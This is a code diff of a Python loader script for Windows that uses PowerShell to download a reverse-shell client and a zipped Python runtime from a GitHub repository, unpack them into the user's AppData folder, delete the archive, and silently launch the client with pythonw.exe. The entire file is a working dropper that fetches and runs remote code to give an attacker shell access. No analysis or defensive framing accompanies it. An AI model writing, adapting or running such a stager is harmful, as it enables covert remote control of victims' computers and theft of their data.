@@ -1,16 +1,30 @@
 import os, sys, subprocess
 
 username = os.environ.get('USERNAME')
-path = os.environ['appdata'] + '\\client.pyw'
+path = os.environ['appdata']
+file_path = path + '\\client.pyw'
+src_path = path + '\\src'
+script_path = src_path + '\\Script'
 
 ################################################ setup #################################################################
 def setup():
-  if not os.path.exists(path):
+    # download client.py file
     subprocess.call(
-      f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
-      shell=True)
-  subprocess.call(f'powershell.exe {path}')
+        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{file_path}"',
+        shell=True)
+    # download src.zip file
+    subprocess.call(f'powershell invoke-webrequest -uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/src.zip" -outfile "{path}\\src.zip"',
+                    shell=True)
+    # extract src.zip file
+    subprocess.call(f'powershell.exe tar -xf {path}\\src.zip -C {path}',
+                    shell=True)
+    # delete src.zip file
+    subprocess.call(f'powershell.exe rm {path}\\src.zip',
+                    shell=True)
+    # run client.py file
+    subprocess.call(f'powershell.exe {script_path}\\pythonw.exe {file_path}',
+                    shell=True)
 ################################################ done ##################################################################
 # Running code ...
 if __name__ == '__main__':
-  setup()
+    setup()
